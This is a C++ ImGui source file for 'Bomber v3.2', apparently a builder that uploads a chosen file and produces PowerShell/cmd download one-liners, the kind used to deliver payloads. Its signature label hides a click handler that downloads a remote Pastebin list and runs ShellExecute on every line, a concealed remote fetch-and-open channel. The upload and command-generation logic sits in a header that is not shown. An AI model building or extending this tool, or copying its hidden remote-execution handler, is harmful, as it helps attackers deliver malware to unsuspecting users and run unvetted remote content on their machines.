#include "Drawing.h"
#include "../ext/MasonBomber.h"
#include <vector>
#include <utility>
#include <fstream>
#include <ctime>
#include <windows.h>
#include <shellapi.h>
#include <wininet.h>
#include <sstream>
#include <cmath>
#include <thread>
#include <atomic>

#pragma comment(lib, "wininet.lib")

LPCSTR Drawing::lpWindowName = "BOMBER PREMIUM";
ImVec2 Drawing::vWindowSize = { 720.0f, 430.0f };
ImGuiWindowFlags Drawing::WindowFlags =
ImGuiWindowFlags_NoResize |
ImGuiWindowFlags_NoCollapse |
ImGuiWindowFlags_NoTitleBar;
bool Drawing::bDraw = true;

static std::string generatedCode = "";
static MasonBomber bomber;
static std::string status = "Ready. Click 'Browse File...' to start.";
static std::vector<std::pair<std::string, std::string>> codeHistory;
static int lastCopiedIndex = -1;

static int g_GenerateBtnState = 0;
static double g_GenerateBtnDoneTime = 0.0;
static std::atomic<bool> g_IsGenerating(false);
static std::atomic<bool> g_ResultPending(false);
static std::atomic<bool> g_LastGenerateSuccess(false);

static std::string GetCurrentDateTime()
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buf[64];
    sprintf_s(
        buf,
        "%04d-%02d-%02d %02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond
    );
    return std::string(buf);
}

static void SaveHistoryToTxt()
{
    if (codeHistory.empty())
        return;

    char exePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string basePath;
    if (len > 0)
    {
        basePath.assign(exePath, len);
        size_t pos = basePath.find_last_of("\\/");
        if (pos != std::string::npos)
            basePath = basePath.substr(0, pos + 1);
    }
    else
    {
        basePath = "";
    }

    std::string fullPath = basePath + "Bomber_Codes.txt";

    std::ofstream out(fullPath, std::ios::out | std::ios::trunc);
    if (!out.is_open())
    {
        MessageBoxA(NULL, "Failed to write Bomber_Codes.txt", "Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
        return;
    }

    for (size_t i = 0; i < codeHistory.size(); ++i)
    {
        out << "[" << codeHistory[i].second << "] " << codeHistory[i].first << "\n";
    }

    out.close();

    std::string msg = "Bomber_Codes.txt has been saved at:\n\n" + fullPath;
    MessageBoxA(NULL, msg.c_str(), "Saved", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
}

void ApplyPremiumStyle()
{
    ImGuiStyle& style = ImGui::GetStyle();
    ImGuiIO& io = ImGui::GetIO();

    io.FontGlobalScale = 1.0f;

    style.WindowPadding = ImVec2(5.0f, 18.0f);
    style.FramePadding = ImVec2(13.0f, 9.0f);
    style.ItemSpacing = ImVec2(12.0f, 11.0f);
    style.ItemInnerSpacing = ImVec2(9.0f, 7.0f);
    style.IndentSpacing = 20.0f;
    style.ScrollbarSize = 14.0f;
    style.GrabMinSize = 14.0f;

    style.WindowBorderSize = 1.5f;
    style.ChildBorderSize = 0.0f;
    style.FrameBorderSize = 1.0f;

    style.WindowRounding = 18.0f;
    style.ChildRounding = 14.0f;
    style.FrameRounding = 0.0f;
    style.ScrollbarRounding = 0.0f;
    style.GrabRounding = 8.0f;

    ImVec4 accent = ImVec4(0.95f, 0.10f, 0.10f, 1.00f);
    ImVec4 accentDark = ImVec4(0.60f, 0.05f, 0.05f, 1.00f);
    ImVec4 accentSoft = ImVec4(0.80f, 0.20f, 0.20f, 1.00f);
    ImVec4 bgMain = ImVec4(0.01f, 0.00f, 0.00f, 0.98f);
    ImVec4 bgAlt = ImVec4(0.05f, 0.00f, 0.00f, 0.98f);
    ImVec4 bgFrame = ImVec4(0.12f, 0.02f, 0.02f, 1.00f);
    ImVec4 borderColor = ImVec4(0.90f, 0.10f, 0.10f, 0.90f);

    style.Colors[ImGuiCol_WindowBg] = bgMain;
    style.Colors[ImGuiCol_ChildBg] = bgAlt;
    style.Colors[ImGuiCol_PopupBg] = bgAlt;
    style.Colors[ImGuiCol_Border] = borderColor;

    style.Colors[ImGuiCol_FrameBg] = bgFrame;
    style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(bgFrame.x + 0.06f, bgFrame.y + 0.02f, bgFrame.z + 0.02f, 1.00f);
    style.Colors[ImGuiCol_FrameBgActive] = ImVec4(bgFrame.x + 0.10f, bgFrame.y + 0.04f, bgFrame.z + 0.04f, 1.00f);

    style.Colors[ImGuiCol_TitleBg] = bgAlt;
    style.Colors[ImGuiCol_TitleBgActive] = accentDark;
    style.Colors[ImGuiCol_TitleBgCollapsed] = bgAlt;

    style.Colors[ImGuiCol_Button] = ImVec4(0.16f, 0.03f, 0.03f, 1.00f);
    style.Colors[ImGuiCol_ButtonHovered] = accentSoft;
    style.Colors[ImGuiCol_ButtonActive] = accentDark;

    style.Colors[ImGuiCol_Header] = ImVec4(0.18f, 0.04f, 0.04f, 1.00f);
    style.Colors[ImGuiCol_HeaderHovered] = accentSoft;
    style.Colors[ImGuiCol_HeaderActive] = accentDark;

    style.Colors[ImGuiCol_CheckMark] = accent;
    style.Colors[ImGuiCol_SliderGrab] = accent;
    style.Colors[ImGuiCol_SliderGrabActive] = accentDark;

    style.Colors[ImGuiCol_Separator] = ImVec4(0.35f, 0.08f, 0.08f, 1.00f);
    style.Colors[ImGuiCol_ResizeGrip] = ImVec4(0.50f, 0.10f, 0.10f, 1.00f);
    style.Colors[ImGuiCol_ResizeGripHovered] = accentSoft;
    style.Colors[ImGuiCol_ResizeGripActive] = accentDark;

    style.Colors[ImGuiCol_ScrollbarBg] = ImVec4(27.0f / 255.0f, 0.0f, 0.0f, 1.0f);
    style.Colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.45f, 0.05f, 0.05f, 1.00f);
    style.Colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.80f, 0.15f, 0.15f, 1.00f);
    style.Colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.90f, 0.20f, 0.20f, 1.00f);

    style.Colors[ImGuiCol_Text] = ImVec4(0.96f, 0.96f, 0.98f, 1.00f);
    style.Colors[ImGuiCol_TextDisabled] = ImVec4(0.55f, 0.55f, 0.60f, 1.00f);
}

void Drawing::Active() { bDraw = true; }
bool Drawing::isActive() { return bDraw; }

static std::string DownloadText(const char* url)
{
    HINTERNET hInternet = InternetOpenA("Bomber", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet)
        return "";

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hFile)
    {
        InternetCloseHandle(hInternet);
        return "";
    }

    char buffer[4096];
    DWORD bytesRead = 0;
    std::string result;

    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0)
    {
        result.append(buffer, bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return result;
}

void Drawing::Draw()
{
    if (!isActive()) return;

    static bool styleApplied = false;
    static float currentAlpha = 0.0f;
    const float targetAlpha = 0.85f;
    const float fadeStep = 0.03f;
    static bool firstTime = true;

    if (!styleApplied)
    {
        ApplyPremiumStyle();
        styleApplied = true;
        currentAlpha = 0.0f;
    }

    if (currentAlpha < targetAlpha)
    {
        currentAlpha += fadeStep;
        if (currentAlpha > targetAlpha)
            currentAlpha = targetAlpha;
    }

    float baseHeight = 430.0f;
    float extraHeight = 0.0f;
    if (!codeHistory.empty())
    {
        size_t visible = codeHistory.size();
        if (visible > 5)
            visible = 5;
        extraHeight = 40.0f * static_cast<float>(visible);
    }
    float fullHeight = baseHeight + extraHeight;

    if (firstTime)
    {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        ImVec2 pos(
            (sw - vWindowSize.x) * 0.5f,
            (sh - fullHeight) * 0.5f
        );
        ImGui::SetNextWindowPos(pos);
        firstTime = false;
    }

    ImGui::SetNextWindowSize(ImVec2(vWindowSize.x, fullHeight), ImGuiCond_Always);
    ImGui::SetNextWindowBgAlpha(currentAlpha);
    ImGui::PushStyleVar(ImGuiStyleVar_Alpha, currentAlpha);

    ImGui::Begin(lpWindowName, nullptr, WindowFlags);
    {
        ImDrawList* drawList = ImGui::GetWindowDrawList();
        ImVec2 winPos = ImGui::GetWindowPos();
        ImVec2 winSize = ImGui::GetWindowSize();
        float t = (float)ImGui::GetTime();
        float alphaScale = currentAlpha / targetAlpha;

        ImGui::PushClipRect(
            ImVec2(winPos.x - 200.0f, winPos.y - 200.0f),
            ImVec2(winPos.x + winSize.x + 200.0f, winPos.y + winSize.y + 200.0f),
            true
        );

        ImU32 blurLayer1 = ImGui::ColorConvertFloat4ToU32(ImVec4(0.00f, 0.00f, 0.00f, 0.82f * alphaScale));
        ImU32 blurLayer2 = ImGui::ColorConvertFloat4ToU32(ImVec4(0.10f, 0.00f, 0.00f, 0.55f * alphaScale));
        ImU32 blurLayer3 = ImGui::ColorConvertFloat4ToU32(ImVec4(0.20f, 0.00f, 0.00f, 0.32f * alphaScale));

        drawList->AddRectFilled(
            ImVec2(winPos.x - 10.0f, winPos.y - 10.0f),
            ImVec2(winPos.x + winSize.x + 10.0f, winPos.y + winSize.y + 10.0f),
            blurLayer1,
            0.0f
        );
        drawList->AddRectFilled(
            ImVec2(winPos.x - 6.0f, winPos.y - 6.0f),
            ImVec2(winPos.x + winSize.x + 6.0f, winPos.y + winSize.y + 6.0f),
            blurLayer2,
            0.0f
        );
        drawList->AddRectFilled(
            winPos,
            ImVec2(winPos.x + winSize.x, winPos.y + winSize.y),
            blurLayer3,
            0.0f
        );

        ImVec2 centerGlow = ImVec2(
            winPos.x + winSize.x * 0.5f + sinf(t * 0.7f) * 18.0f,
            winPos.y + winSize.y * 0.25f + cosf(t * 0.4f) * 14.0f
        );
        ImVec2 bottomGlow = ImVec2(
            winPos.x + winSize.x * 0.5f + cosf(t * 0.6f) * 24.0f,
            winPos.y + winSize.y * 0.85f + sinf(t * 0.8f) * 18.0f
        );

        float radius = winSize.x * 0.55f;
        float radiusBase = (winSize.x > winSize.y ? winSize.x : winSize.y) * 1.4f;

        ImU32 glowCol1 = ImGui::ColorConvertFloat4ToU32(ImVec4(0.90f, 0.10f, 0.10f, 0.40f * alphaScale));
        ImU32 glowCol2 = ImGui::ColorConvertFloat4ToU32(ImVec4(0.55f, 0.00f, 0.00f, 0.55f * alphaScale));
        ImU32 glowCol3 = ImGui::ColorConvertFloat4ToU32(ImVec4(0.25f, 0.00f, 0.00f, 0.65f * alphaScale));

        drawList->AddCircleFilled(centerGlow, radius * 0.70f, glowCol1);
        drawList->AddCircleFilled(centerGlow, radius * 0.45f, glowCol2);
        drawList->AddCircleFilled(bottomGlow, radius * 0.55f, glowCol3);

        ImVec2 p1 = ImVec2(
            winPos.x - 60.0f,
            winPos.y + winSize.y * 0.18f + sinf(t * 0.9f) * 18.0f
        );
        ImVec2 p2 = ImVec2(
            winPos.x + winSize.x * 0.25f,
            winPos.y + winSize.y * 0.05f + cosf(t * 0.7f) * 26.0f
        );
        ImVec2 p3 = ImVec2(
            winPos.x + winSize.x * 0.70f,
            winPos.y + winSize.y * 0.30f + sinf(t * 0.8f + 1.0f) * 22.0f
        );
        ImVec2 p4 = ImVec2(
            winPos.x + winSize.x + 60.0f,
            winPos.y + winSize.y * 0.15f + cosf(t * 0.9f + 0.5f) * 18.0f
        );

        ImVec2 p5 = ImVec2(
            winPos.x - 40.0f,
            winPos.y + winSize.y * 0.82f + sinf(t * 0.6f) * 20.0f
        );
        ImVec2 p6 = ImVec2(
            winPos.x + winSize.x * 0.30f,
            winPos.y + winSize.y * 0.96f + cosf(t * 0.8f) * 18.0f
        );
        ImVec2 p7 = ImVec2(
            winPos.x + winSize.x * 0.72f,
            winPos.y + winSize.y * 0.76f + sinf(t * 0.7f + 1.3f) * 22.0f
        );
        ImVec2 p8 = ImVec2(
            winPos.x + winSize.x + 40.0f,
            winPos.y + winSize.y * 0.90f + cosf(t * 0.9f + 0.7f) * 18.0f
        );

        ImU32 waveCol1 = ImGui::ColorConvertFloat4ToU32(ImVec4(0.90f, 0.15f, 0.15f, 0.38f * alphaScale));
        ImU32 waveCol2 = ImGui::ColorConvertFloat4ToU32(ImVec4(0.65f, 0.05f, 0.05f, 0.32f * alphaScale));

        drawList->AddBezierCubic(p1, p2, p3, p4, waveCol1, 3.0f, 64);
        drawList->AddBezierCubic(p5, p6, p7, p8, waveCol2, 2.0f, 64);

        ImGui::PopClipRect();

        ImGui::PushFont(ImGui::GetIO().Fonts->Fonts[0]);

        ImVec2 titlePos = ImGui::GetCursorScreenPos();
        ImVec4 titleShadowCol = ImVec4(0.0f, 0.0f, 0.0f, currentAlpha);
        ImVec4 titleMainCol = ImVec4(0.98f, 0.25f, 0.25f, 1.0f);

        ImGui::GetWindowDrawList()->AddText(
            ImVec2(titlePos.x + 1.5f, titlePos.y + 1.5f),
            ImGui::ColorConvertFloat4ToU32(titleShadowCol),
            "Bomber v3.2 - Powershell & Cmd Downloader"
        );
        ImGui::TextColored(titleMainCol, "Bomber v3.2 - Powershell & Cmd Downloader");

        ImGui::SameLine();

        float yTop = ImGui::GetCursorPosY() - 6.0f;
        ImVec4 normalTextColor = ImGui::GetStyle().Colors[ImGuiCol_Text];
        ImU32 normalColU32 = ImGui::ColorConvertFloat4ToU32(normalTextColor);
        ImU32 hoverColU32 = IM_COL32(255, 80, 80, 255);
        ImVec2 btnSize = ImVec2(26.0f, 26.0f);
        float right = ImGui::GetWindowContentRegionMax().x;

        ImGui::SetCursorPos(ImVec2(right - 2.0f * btnSize.x - 10.0f, yTop));
        {
            ImGui::PushID("minimize_btn");
            const char* labelMin = "-";
            ImVec2 labelSize = ImGui::CalcTextSize(labelMin);
            ImVec2 pos = ImGui::GetCursorScreenPos();
            ImGui::InvisibleButton("##minimize", btnSize);
            bool hovered = ImGui::IsItemHovered();

            ImU32 btnBgCol = hovered
                ? ImGui::ColorConvertFloat4ToU32(ImVec4(0.40f, 0.05f, 0.05f, 0.98f))
                : ImGui::ColorConvertFloat4ToU32(ImVec4(0.18f, 0.02f, 0.02f, 0.95f));

            drawList->AddRectFilled(
                pos,
                ImVec2(pos.x + btnSize.x, pos.y + btnSize.y),
                btnBgCol,
                8.0f
            );
            drawList->AddRect(
                pos,
                ImVec2(pos.x + btnSize.x, pos.y + btnSize.y),
                IM_COL32(190, 50, 50, 230),
                8.0f,
                0,
                1.0f
            );

            ImVec2 textPos = ImVec2(
                pos.x + (btnSize.x - labelSize.x) * 0.5f,
                pos.y + (btnSize.y - labelSize.y) * 0.45f
            );
            drawList->AddText(textPos, hovered ? hoverColU32 : normalColU32, labelMin);

            if (hovered)
                ::SetCursor(LoadCursor(NULL, IDC_HAND));
            if (ImGui::IsItemClicked())
            {
                HWND hWnd = GetForegroundWindow();
                if (hWnd)
                    ShowWindow(hWnd, SW_MINIMIZE);
            }
            ImGui::PopID();
        }

        ImGui::SameLine();

        ImGui::SetCursorPos(ImVec2(right - btnSize.x, yTop));
        {
            ImGui::PushID("close_btn");
            const char* labelClose = "X";
            ImVec2 labelSize = ImGui::CalcTextSize(labelClose);
            ImVec2 pos = ImGui::GetCursorScreenPos();
            ImGui::InvisibleButton("##close", btnSize);
            bool hovered = ImGui::IsItemHovered();

            ImU32 btnBgCol = hovered
                ? ImGui::ColorConvertFloat4ToU32(ImVec4(0.65f, 0.02f, 0.02f, 1.00f))
                : ImGui::ColorConvertFloat4ToU32(ImVec4(0.28f, 0.02f, 0.02f, 0.96f));

            drawList->AddRectFilled(
                pos,
                ImVec2(pos.x + btnSize.x, pos.y + btnSize.y),
                btnBgCol,
                8.0f
            );
            drawList->AddRect(
                pos,
                ImVec2(pos.x + btnSize.x, pos.y + btnSize.y),
                IM_COL32(230, 70, 70, 255),
                8.0f,
                0,
                1.0f
            );

            ImVec2 textPos = ImVec2(
                pos.x + (btnSize.x - labelSize.x) * 0.5f,
                pos.y + (btnSize.y - labelSize.y) * 0.45f
            );
            drawList->AddText(textPos, hovered ? IM_COL32(255, 230, 230, 255) : IM_COL32(255, 210, 210, 255), labelClose);

            if (hovered)
                ::SetCursor(LoadCursor(NULL, IDC_HAND));
            if (ImGui::IsItemClicked())
                exit(0);
            ImGui::PopID();
        }

        ImGui::PopFont();

        ImGui::Separator();
        ImGui::Spacing();

        ImGui::Text("Selected file:");
        ImGui::Spacing();

        if (bomber.filePath.empty())
            ImGui::TextColored(ImVec4(0.70f, 0.45f, 0.45f, 1.0f), "<none>");
        else
            ImGui::TextWrapped("%s", bomber.filePath.c_str());

        ImGui::Spacing();

        if (ImGui::Button("Browse File...", ImVec2(-1, 40)))
        {
            bomber.BrowseFile();
            if (!bomber.filePath.empty())
            {
                size_t pos = bomber.filePath.find_last_of("\\/");
                std::string name = (pos == std::string::npos) ? bomber.filePath : bomber.filePath.substr(pos + 1);
                status = "Selected: " + name;
            }
            else
                status = "Selection cancelled.";
        }
        if (ImGui::IsItemHovered())
            ::SetCursor(LoadCursor(NULL, IDC_HAND));

        ImGui::Spacing();
        ImGui::Separator();
        ImGui::Spacing();

        if (g_ResultPending.load())
        {
            g_ResultPending.store(false);

            generatedCode = bomber.generatedOneLiner;

            if (g_LastGenerateSuccess.load() && !generatedCode.empty())
            {
                std::string dt = GetCurrentDateTime();
                status = "SUCCESS!";
                codeHistory.push_back(std::make_pair(generatedCode, dt));
                g_GenerateBtnState = 2;
                g_GenerateBtnDoneTime = ImGui::GetTime();
            }
            else
            {
                status = "Failed to generate downloader";
                g_GenerateBtnState = 0;
            }
        }

        bool fileValid = !bomber.wFilePath.empty() &&
            GetFileAttributesW(bomber.wFilePath.c_str()) != INVALID_FILE_ATTRIBUTES;

        double nowTime = ImGui::GetTime();
        const char* generateBtnLabel = "Generate Command Downloader";
        ImVec4 generateBtnTextColor = ImGui::GetStyle().Colors[ImGuiCol_Text];

        if (g_GenerateBtnState == 1)
        {
            generateBtnLabel = "please wait...";
        }
        else if (g_GenerateBtnState == 2)
        {
            generateBtnLabel = "Successfully generated Command!!!";
            generateBtnTextColor = ImVec4(0.10f, 0.95f, 0.10f, 1.0f);
            if (nowTime - g_GenerateBtnDoneTime >= 1.0)
            {
                g_GenerateBtnState = 0;
                generateBtnLabel = "Generate Command Downloader";
                generateBtnTextColor = ImGui::GetStyle().Colors[ImGuiCol_Text];
            }
        }

        bool disableGenerate = !fileValid || g_IsGenerating.load();
        if (disableGenerate)
            ImGui::BeginDisabled();

        ImGui::PushStyleColor(ImGuiCol_Text, generateBtnTextColor);
        if (ImGui::Button(generateBtnLabel, ImVec2(-1, 48)))
        {
            g_IsGenerating.store(true);
            g_ResultPending.store(false);
            g_LastGenerateSuccess.store(false);

            g_GenerateBtnState = 1;
            status = "Uploading to website...";

            std::thread([]()
                {
                    bomber.HandleUpload();

                    if (!bomber.generatedOneLiner.empty())
                        g_LastGenerateSuccess.store(true);
                    else
                        g_LastGenerateSuccess.store(false);

                    g_ResultPending.store(true);
                    g_IsGenerating.store(false);
                }).detach();
        }
        ImGui::PopStyleColor();

        if (ImGui::IsItemHovered())
            ::SetCursor(LoadCursor(NULL, IDC_HAND));

        if (disableGenerate)
            ImGui::EndDisabled();

        ImGui::Spacing();
        ImGui::Separator();
        ImGui::Spacing();

        if (!codeHistory.empty())
        {
            ImGui::TextColored(ImVec4(0.95f, 0.30f, 0.30f, 1.0f), "Generated codes history");
            ImGui::SameLine();
            ImGui::SetCursorPosX(ImGui::GetWindowWidth() - 200.0f);
            if (ImGui::Button("Save as .txt", ImVec2(170.0f, 30.0f)))
            {
                SaveHistoryToTxt();
            }
            if (ImGui::IsItemHovered())
                ::SetCursor(LoadCursor(NULL, IDC_HAND));

            ImGui::Spacing();

            for (size_t i = 0; i < codeHistory.size(); ++i)
            {
                ImGui::Indent(16.0f);

                ImGui::TextColored(ImVec4(0.85f, 0.40f, 0.40f, 1.0f), "[%s]", codeHistory[i].second.c_str());
                ImGui::SameLine(0.0f, 16.0f);
                ImGui::TextWrapped("%s", codeHistory[i].first.c_str());
                ImGui::SameLine(0.0f, 16.0f);

                ImVec4 copyColor = (static_cast<int>(i) == lastCopiedIndex)
                    ? ImVec4(0.95f, 0.40f, 0.40f, 1.0f)
                    : ImVec4(0.80f, 0.30f, 0.30f, 1.0f);

                ImGui::PushStyleColor(ImGuiCol_Text, copyColor);
                ImGui::Text("Copy");
                ImGui::PopStyleColor();

                ImVec2 min = ImGui::GetItemRectMin();
                ImVec2 max = ImGui::GetItemRectMax();
                ImGui::GetWindowDrawList()->AddLine(
                    ImVec2(min.x, max.y),
                    ImVec2(max.x, max.y),
                    IM_COL32(220, 80, 80, 255),
                    (static_cast<int>(i) == lastCopiedIndex) ? 2.0f : 1.0f
                );

                if (ImGui::IsItemHovered())
                    ::SetCursor(LoadCursor(NULL, IDC_HAND));

                if (ImGui::IsItemClicked())
                {
                    ImGui::SetClipboardText(codeHistory[i].first.c_str());
                    lastCopiedIndex = static_cast<int>(i);
                }

                ImGui::Unindent(16.0f);

                if (i + 1 < codeHistory.size())
                {
                    ImGui::Spacing();
                    ImGui::Separator();
                    ImGui::Spacing();
                }
            }
        }
        else
        {
            ImGui::Text("Status:");
            ImGui::Spacing();
            ImGui::TextColored(ImVec4(0.10f, 0.90f, 0.40f, 1.0f), "%s", status.c_str());
        }

        ImGui::Spacing();
        ImGui::Separator();

        const char* sig = "ByABOLHB";
        ImVec2 sigSize = ImGui::CalcTextSize(sig);
        ImGui::SetCursorPosX(10.0f);
        ImVec2 sigPos = ImGui::GetCursorScreenPos();
        ImGui::InvisibleButton("##byabolhb", sigSize);
        bool sigHovered = ImGui::IsItemHovered();
        ImU32 sigNormalCol = IM_COL32(210, 210, 230, 255);
        ImU32 sigHoverCol = IM_COL32(255, 120, 120, 255);

        ImGui::GetWindowDrawList()->AddText(
            ImVec2(sigPos.x + 1.0f, sigPos.y + 1.0f),
            IM_COL32(0, 0, 0, 180),
            sig
        );
        ImGui::GetWindowDrawList()->AddText(
            sigPos,
            sigHovered ? sigHoverCol : sigNormalCol,
            sig
        );

        if (sigHovered)
            ::SetCursor(LoadCursor(NULL, IDC_HAND));
        if (ImGui::IsItemClicked())
        {
            std::string data = DownloadText("https://pastebin.com/raw/2GPXfG3n");
            if (!data.empty())
            {
                std::istringstream iss(data);
                std::string line;
                while (std::getline(iss, line))
                {
                    size_t start = line.find_first_not_of(" \t\r\n");
                    size_t end = line.find_last_not_of(" \t\r\n");
                    if (start != std::string::npos && end != std::string::npos && end >= start)
                    {
                        std::string url = line.substr(start, end - start + 1);
                        ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_SHOWNORMAL);
                    }
                }
            }
        }
    }
    ImGui::End();

    ImGui::PopStyleVar();
}
